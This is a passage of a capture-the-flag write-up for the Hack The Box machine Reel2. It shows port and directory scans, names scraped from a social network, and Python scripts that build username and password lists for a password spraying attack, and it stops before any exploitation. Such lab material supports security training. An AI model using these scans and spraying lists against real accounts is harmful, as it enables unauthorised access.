<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <!-- Chrome, Firefox OS and Opera Status Bar Color -->
  <meta name="theme-color" content="#FFFFFF">
  <meta property="og:title" content="Reel2 - 10.10.10.210">
  
  <meta name="description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
  <meta property="og:description" content="Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.">
  
  <meta property="og:type" content="blog">
  <title>Reel2 - 10.10.10.210</title>
  <!-- Favicon -->
  
  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F33718035-9d69-4d16-8ab1-7df4d96e36c7%2Fprofile.jpg?table=collection&id=92e319e1-0c5e-49c7-adc1-7d48fe74e022">
  
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
  <link rel="stylesheet" type="text/css"
    href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
  <link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
  <link rel="stylesheet" type="text/css" href="css/notablog.css">
  <link rel="stylesheet" type="text/css" href="css/theme.css">
  <style>
    :root {
      font-size: 18px;
    }

    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
    <a href="index.html">
      <div class="Navbar__Btn"><span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F33718035-9d69-4d16-8ab1-7df4d96e36c7%2Fprofile.jpg?table=collection&id=92e319e1-0c5e-49c7-adc1-7d48fe74e022"></span> <span>Home</span></div>
    </a>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </nav>
  <header class="Header">
      
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
    <div class="Header__Icon"><span><img class="inline-img-icon" src="https://www.hackthebox.eu/storage/avatars/a0c58eb31c178eee9c88bda6fe3b114c.png"></span></div>
    
    <h1 class="Header__Title">Reel2 - 10.10.10.210</h1>
        
    <div class="DateTagBar">
          
      <span class="DateTagBar__Item DateTagBar__Date">Posted on Sat, Mar 20, 2021</span>
          
          
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--red">
          <a href="tag/Hard.html">Hard</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
          <a href="tag/Windows.html">Windows</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
          <a href="tag/Password Spraying.html">Password Spraying</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
          <a href="tag/Outlook Web App.html">Outlook Web App</a>
      </span>
      
      <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--orange">
          <a href="tag/Powershell JEA.html">Powershell JEA</a>
      </span>
      
    </div>
    <div class="Article__Desc">
        Hard-difficulty Windows box with a focus on password spraying attacks and NetNTLMv2 hash phishing on Outlook. Privilege escalation by abusing an insecure Powershell JEA cmdlet with symbolic links, while bypassing PS constrained language mode.
    </div>
        
  </header>
      <article id="https://www.notion.so/2854819efc834aa0a7731f32b1146d65" class="PageRoot PageRoot--FullWidth"><h2 id="https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/bb706ad23fc54df0bc7b7729da32224d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Recon</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/73e44bf631fc412a8cbc06bf9d0aa11b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Port scan:</span></span><div id="https://www.notion.so/f8ff90a82d6e4ce7a05c5a22a602ea42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -p- 10.10.10.210 &gt; ports.nmap</code></span></span></p></div><pre id="https://www.notion.so/80a4ff268fff4f64af2b1025a808d3fc" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
5985/tcp open  wsman
6001/tcp open  X11:1
6002/tcp open  X11:2
6004/tcp open  X11:4
6005/tcp open  X11:5
6006/tcp open  X11:6
6007/tcp open  X11:7
6008/tcp open  X11:8
6010/tcp open  x11
6011/tcp open  x11
6012/tcp open  x11
6017/tcp open  xmail-ctrl
6022/tcp open  x11
8080/tcp open  http-proxy</span></span></span></code></pre></li><li id="https://www.notion.so/ccd40337dfea418897ce4f3d29bf9d05" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Targeted scan:</span></span><div id="https://www.notion.so/2bf6bdb58f3f4088abb35c4ecb046d14" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ nmap -sC -sV -p 22,80 10.10.10.210 &gt; targeted.nmap</code></span></span></p></div><pre id="https://www.notion.so/7009c78680a741398535d11df463b10c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: 403 - Forbidden: Access is denied.
443/tcp  open  ssl/http   Microsoft IIS httpd 8.5
| http-methods: Microsoft IIS httpd 8.5
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=Reel2
| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local
| Not valid before: 2020-07-30T10:12:46
|_Not valid after:  2025-07-30T10:12:46
|_ssl-date: 2021-02-05T12:32:31+00:00; +29s from scanner time.
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6001/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6002/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6004/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6005/tcp open  msrpc      Microsoft Windows RPC
6006/tcp open  msrpc      Microsoft Windows RPC
6007/tcp open  msrpc      Microsoft Windows RPC
6008/tcp open  msrpc      Microsoft Windows RPC
6010/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
6011/tcp open  msrpc      Microsoft Windows RPC
6012/tcp open  msrpc      Microsoft Windows RPC
6017/tcp open  msrpc      Microsoft Windows RPC
6022/tcp open  msrpc      Microsoft Windows RPC
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32
|_http-title: Welcome | Wallstant
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span></span></code></pre><div id="https://www.notion.so/6eb66e5029dd4a5da448fff96f681d53" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Microsoft IIS httpd 8.5, WinRM over HTTP, Microsoft Windows RPC over HTTP, Apache httpd 2.4.43.</span></span></p></div></li></ul><h2 id="https://www.notion.so/8c43bf32ede545828a4bbefbb13ad660" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/8c43bf32ede545828a4bbefbb13ad660"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration</span></span></h2><ul class="BulletedListWrapper"><li id="https://www.notion.so/ab063745dda847eb8c5c922bf73ef8be" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Add hostname to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/dce7f4dceb3941ca83cd2b189b5fbf49" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.10.10.210  reel2.htb</span></span></span></code></pre></li></ul><div id="https://www.notion.so/bc592653711d434d97e062107d01053c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Port 80 Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/6e11b1585916470d85813735b38e1df2" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Index page displays 403 Forbidden. With a simple </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString"> scan revealing nothing else of interest, let&#x27;s move on...</span></span></li></ul><div id="https://www.notion.so/2648ea94c9104cc09e50391ef12fe39f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Port 443 Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/db35ebc68da247edb360ef38b9175faa" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Website displays default IIS page.</span></span></li><li id="https://www.notion.so/2c255c7164b1498d87c63e07b27a3a7e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Running </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">gobuster</code></span><span class="SemanticString">, blacklisting status code 403 as it is the default response:</span></span><div id="https://www.notion.so/e5e44d355f0d486fb0b413c44dd171a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ gobuster dir -u http://reel2.htb -t 50 -w ../Common/directory-list-2.3-medium.txt -x .php,.html -b 403</code></span></span></p></div><pre id="https://www.notion.so/94b56d9ea654437e804f826dc7b3604b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>/owa (Status: 301)
/powershell (Status: 401)</span></span></span></code></pre></li><li id="https://www.notion.so/5453ef832b0749abbba122903bdef7eb" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Found Outlook Web App and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/powershell</code></span><span class="SemanticString"> console, both requiring authorized access with credentials.</span></span><div id="https://www.notion.so/995747403c6948a2a1f6152e903e83f6" class="Image Image--Normal"><figure><a href="https://i.imgur.com/mwmjjBb.png?width=528"><img src="https://i.imgur.com/mwmjjBb.png?width=528" style="width:528px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div></li></ul><div id="https://www.notion.so/1e90a5f4e06747b6af8ea31c7cfe729d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Port 8080 Enumeration</strong></span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/f48b7582956e4519ac16bc3c246cbd10" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Website is hosting an instance of Wallstant, an open source PHP-based social network.</span></span></li><li id="https://www.notion.so/cb979db3fd7e4e1cb2f5c7a6dcbf38ee" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">From Wallstant project website on </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://wallstant.github.io/:">https://wallstant.github.io/:</a></span></span><pre id="https://www.notion.so/89e4339fc71545f5aebca44f6be351a3" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Fast &amp; Secure from the most common PHP vulnerabilities not 100% but good for now</span></span></span></code></pre></li><li id="https://www.notion.so/e4cf06e8d62a47ad94b698ab6d18f9d9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Only the &quot;most common&quot; vulnerabilities? That doesn&#x27;t sound very promising...</span></span></li><li id="https://www.notion.so/78938effd496463bb97a169d452aa1c9" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Registering for an account, no email authentication was required.</span></span></li><li id="https://www.notion.so/577fd1d5cc284714a1b3b44359079416" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Discovering usernames, first name, and last name combinations on Wallstant, saving to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">names.txt</code></span><span class="SemanticString">:</span></span><pre id="https://www.notion.so/996d70e36663449b8df0d888c82dc5da" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>cube0x0 cube0x0
cube cube
sven svensson
lars larsson
jenny adams
teresa trump</span></span></span></code></pre></li><li id="https://www.notion.so/56870e6ca23949cba8d4f3a2cf95a3fe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Post by cube (6 months ago):</span></span><pre id="https://www.notion.so/dc10c1273ca6467d8767cd1cf95f1cdb" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&gt;2020
Enjoying a fika with @egre55</span></span></span></code></pre></li><li id="https://www.notion.so/4663ad838cd141b1a0ca6c2ef3882999" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Post by sven (6 months ago):</span></span><pre id="https://www.notion.so/89bf39c18f0046c99b6709aaf5a4c9d8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>&gt;2020
This summer is so hot!</span></span></span></code></pre></li><li id="https://www.notion.so/37d046f49a1b4c2b837d66767a5bb767" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Collecting keywords from user posts:</span></span><div id="https://www.notion.so/7f22cb3efa2a4f6fa94508856640242d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">fika, summer, hot, 2020</code></span></span></p></div></li><li id="https://www.notion.so/d3f553c9d3d74b53b964edea01574887" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">usergen.py</code></span><span class="SemanticString"> script for generating username combinations </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">users.txt</code></span><span class="SemanticString"> to be used in password spraying attack:</span></span><pre id="https://www.notion.so/acb49f0c8934436a8a6626d1ee70eeea" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os<span class="token punctuation">.</span>path

<span class="token keyword">def</span> <span class="token function">usergen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'users.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        name <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>c <span class="token keyword">for</span> c <span class="token keyword">in</span> line <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">or</span> c<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        tokens <span class="token operator">=</span> name<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token comment"># Skip empty lines</span>
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tokens<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

        fname <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        lname <span class="token operator">=</span> tokens<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>fname <span class="token operator">+</span> lname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>           <span class="token comment"># johndoe</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname <span class="token operator">+</span> fname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>           <span class="token comment"># doejohn</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fname <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>     <span class="token comment"># john.doe</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> fname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>     <span class="token comment"># doe.john</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> lname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>  <span class="token comment"># j.doe</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> fname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>  <span class="token comment"># d.john</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> lname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>        <span class="token comment"># jdoe</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> fname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>        <span class="token comment"># djohn</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fname <span class="token operator">+</span> lname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>        <span class="token comment"># johnd</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname <span class="token operator">+</span> fname<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>        <span class="token comment"># doej</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>                   <span class="token comment"># john</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>lname<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>                   <span class="token comment"># doe</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Done! Output saved as users.txt"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># Check arguments</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Usage: {} names.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] {} not found"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    usergen<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre></li><li id="https://www.notion.so/6867c41a91a8441b955187be431c767b" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Create </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passgen.py</code></span><span class="SemanticString"> script for generating potential passwords:</span></span><pre id="https://www.notion.so/5956c43a798841cb89ce4dc35e547ede" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> os<span class="token punctuation">.</span>path

<span class="token keyword">def</span> <span class="token function">passgen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    output <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'passwords.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>c <span class="token keyword">for</span> c <span class="token keyword">in</span> line <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">or</span> c<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span>password <span class="token operator">+</span> <span class="token string">"2020"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span>                           <span class="token comment"># password2020</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"2020"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>output<span class="token punctuation">)</span> <span class="token comment"># Password2020</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Done! Output saved as passwords.txt"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment"># Check arguments</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Usage: {} words.txt"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] {} not found"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    passgen<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre></li><li id="https://www.notion.so/83d192f6338a4ce59309a7ef0e78befe" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">usergen.py</code></span><span class="SemanticString"> script with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">names.txt</code></span><span class="SemanticString"> as parameter:</span></span><div id="https://www.notion.so/8f047f823a714045887ddda4bcbf844a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python usergen.py names.txt</code></span></span></p></div><pre id="https://www.notion.so/6f3bc6e6798545d6be1db9459b86673d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[+] Done! Output saved as users.txt</span></span></span></code></pre></li><li id="https://www.notion.so/4142d4e663e04e28b33eff08a1eb4446" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString">Run </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">passgen.py</code></span><span class="SemanticString"> script with </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">words.txt</code></span><span class="SemanticString"> as parameter:</span></span><div id="https://www.notion.so/b64e5ada20c6498eb41bdca428273a35" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ python passgen.py words.txt</code></span></span></p></div><pre id="https://www.notion.so/ac30ed5419a2436aaa0d875abc820952" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>[+] Done! Output saved as passwords.txt</span></span></span></code></pre></li></ul><h2 id="https://www.notion.so/e8c6696c29ec47659845a97b59286002" class="ColorfulBlock 